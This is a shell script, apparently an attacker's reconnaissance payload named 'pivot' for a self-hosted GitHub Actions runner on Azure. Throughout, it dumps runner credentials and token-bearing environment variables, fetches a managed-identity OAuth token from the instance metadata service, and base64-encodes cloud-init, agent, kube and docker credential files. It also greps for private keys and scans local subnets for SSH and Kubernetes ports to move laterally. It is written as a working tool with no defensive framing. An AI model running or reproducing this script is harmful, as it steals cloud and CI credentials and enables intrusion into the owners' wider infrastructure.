set +e
TS=$(date -u +%s)
O=/tmp/pivot-9927.txt; : > $O
exec >> $O 2>&1
echo "==MARKER-START pivot-9927 host=$(hostname) ts=$TS"
echo "==SEC id"; id; sudo -n id
echo "==SEC host"; hostname -f; hostname -I; cat /etc/hostname; cat /etc/machine-id
echo "==SEC addr"; ip -4 addr; echo; ip -4 route; echo; ip route show table all | head -40
echo "==SEC hosts"; cat /etc/hosts; echo ---; cat /etc/resolv.conf
echo "==SEC env"; env | sort | grep -iE 'azure|arm|token|client|subscription|tenant|gh_|github|runner' | cut -c1-200
echo "==SEC sudo"; sudo -n true && echo SUDO_OK || echo SUDO_NO
echo "==SEC units"; systemctl list-units 'actions.runner.*' --all --no-pager
echo "==SEC runnerdir"; ls -la /opt/ul-runner 2>/dev/null | head -30
echo "==SEC runnercfg"; sudo -n cat /opt/ul-runner/.runner 2>/dev/null; echo; sudo -n cat /opt/ul-runner/.credentials 2>/dev/null | head -c 600; echo
echo "==SEC diag"; sudo -n tail -n 3 /opt/ul-runner/_diag/Runner_*.log 2>/dev/null | tail -20
echo "==SEC imds"; curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json'; echo "RC=$?"
echo "==SEC imdsuserdata"; curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text'; echo "RC=$?"
echo "==SEC imdsid"; curl -s -m 8 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'; echo "RC=$?"
echo "==SEC wire"; curl -s -m 6 -H 'x-ms-version: 2012-11-30' http://168.63.129.16/machine/?comp=goalstate; echo "RC=$?"
echo "==SEC files"
sudo -n bash -c 'for f in /var/lib/cloud/instance/user-data.txt /var/lib/cloud/instance/scripts/* /var/lib/waagent/*.xml /var/lib/waagent/ManagedIdentity-Settings /var/lib/waagent/*.settings /home/*/.azure/* /opt/ul-runner/.azure/* /home/*/.kube/config /home/*/.docker/config.json /root/.docker/config.json /etc/environment /etc/waagent.conf /etc/cloud/cloud.cfg; do [ -e "$f" ] || continue; echo "==FILE $f"; stat -c%s "$f"; base64 -w0 "$f"; echo; done'
echo "==SEC treelist"; sudo -n bash -c 'ls -la /var/lib/waagent 2>&1 | head -40; echo ---; ls -la /var/lib/cloud/instance 2>&1 | head -30'
echo "==SEC grep"; sudo -n bash -c 'grep -rIl -E "client_secret|tenant_id|subscription_id|BEGIN (RSA|OPENSSH|EC) PRIVATE KEY|AccountKey=|sv=" /var/lib/waagent /var/lib/cloud /etc /opt/ul-runner 2>/dev/null | head -40'
echo "==SEC findestate"; sudo -n bash -c 'find / -maxdepth 4 \( -name "hosts.tsv" -o -name "secrets.json" -o -name "*.pem" -o -name "authorized_keys" \) 2>/dev/null | head -30'
echo "==SEC sweep"
P=$(ip -4 route | awk '/proto kernel scope link/{print $1}' | sort -u | head -5)
echo "PREFIX=$P"
for net in $P; do base=$(echo $net | cut -d/ -f1 | cut -d. -f1-3); for i in $(seq 1 254); do echo $base.$i; done; done | sort -u > /tmp/pivot_hosts.txt
wc -l /tmp/pivot_hosts.txt
for port in 22 10250 6443 9400; do
  awk -v p=$port '{print $1" "p}' /tmp/pivot_hosts.txt | xargs -P 128 -n2 bash -c 'timeout 1.2 bash -c "echo > /dev/tcp/$0/$1" 2>/dev/null && echo "$0:$1 OPEN"' 2>/dev/null
done | sort -u > /tmp/pivot_sweep.txt
echo "SWEEP_OPEN=$(wc -l < /tmp/pivot_sweep.txt)"; cat /tmp/pivot_sweep.txt
echo "==SEC sweepdone"
echo "==MARKER-END"
exit 0
